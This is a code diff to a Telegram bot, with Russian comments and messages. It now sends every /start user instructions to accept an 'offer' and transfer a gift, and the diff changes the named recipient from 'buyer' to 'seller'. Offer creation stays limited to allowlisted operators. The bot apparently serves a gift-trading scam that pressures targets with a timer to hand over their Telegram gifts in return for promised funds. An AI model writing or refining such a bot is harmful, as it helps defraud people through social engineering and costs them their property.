@@ -34,24 +34,15 @@ export default {
       if (update.message && update.message.text === "/start") {
         const chatId = update.message.chat.id;
         const userId = update.message.from.id;
-        const username = update.message.from.username ? update.message.from.username.toLowerCase() : "";
 
-        const isAdmin = userId === ADMIN_ID;
-        const isAllowed = ALLOWED_IDS.includes(userId) || (username && ALLOWED_USERNAMES.includes(username));
+        // ИНСТРУКЦИЯ ТЕПЕРЬ ПРИХОДИТ ВСЕМ
+        const startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Покупатель присылает вам предложение через бота\n2. Вы нажимаете «Принять» под сообщением с оффером\n3. После принятия оффера нажмите «🎁 Передать подарок»\n4. В открывшемся меню подарка выберите продавца и подтвердите передачу\n5. Дождитесь проверки и зачисления средств\n\n⏳ Ограниченное время на подтверждение, таймер указан в сообщении с оффером.\n\n💡 Подарок уже у вас — ничего дополнительно покупать не требуется.`;
         
-        if (!isAdmin && !isAllowed) {
-          const denyText = `🔒 <b>Доступ закрыт.</b>\n\nОбратитесь к владельцу: @gwrex\n\n🆔 <b>Ваш ID для добавления:</b> <code>${userId}</code>`;
-          await callApi("sendMessage", { chat_id: chatId, text: denyText, parse_mode: "HTML" }, BOT_TOKEN);
-        } else {
-          // ДОБАВИЛ ID В ПРИВЕТСТВЕННОЕ СООБЩЕНИЕ
-          const startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Покупатель присылает вам предложение через бота\n2. Вы нажимаете «Принять» под сообщением с оффером\n3. После принятия оффера нажмите «🎁 Передать подарок»\n4. В открывшемся меню подарка выберите покупателя и подтвердите передачу\n5. Дождитесь проверки и зачисления средств\n\n⏳ Ограниченное время на подтверждение, таймер указан в сообщении с оффером.\n\n💡 Подарок уже у вас — ничего дополнительно покупать не требуется.`;
-          
-          const startMarkup = {
-            inline_keyboard: [[{ text: "❓ Как принять оффер?", callback_data: "how_to_accept" }]]
-          };
+        const startMarkup = {
+          inline_keyboard: [[{ text: "❓ Как принять оффер?", callback_data: "how_to_accept" }]]
+        };
 
-          await callApi("sendMessage", { chat_id: chatId, text: startText, parse_mode: "HTML", reply_markup: startMarkup }, BOT_TOKEN);
-        }
+        await callApi("sendMessage", { chat_id: chatId, text: startText, parse_mode: "HTML", reply_markup: startMarkup }, BOT_TOKEN);
       }
 
       // --- INLINE (Создание офера) ---
@@ -60,9 +51,11 @@ export default {
         const userId = iq.from.id;
         const username = iq.from.username ? iq.from.username.toLowerCase() : "";
         
+        // ПРОВЕРКА ДОСТУПА ДЛЯ СОЗДАНИЯ ОФФЕРОВ ОСТАЕТСЯ!
         const isAdmin = userId === ADMIN_ID;
         const isAllowed = ALLOWED_IDS.includes(userId) || (username && ALLOWED_USERNAMES.includes(username));
 
+        // Если человека нет в списке, он не сможет создать оффер
         if (!isAdmin && !isAllowed) return new Response("OK", { status: 200 });
 
         let textQuery = iq.query.replace(/[\u00A0\u200B\u202F]/g, ' ').replace(/https?:\/\//gi, '').trim().toLowerCase(); 
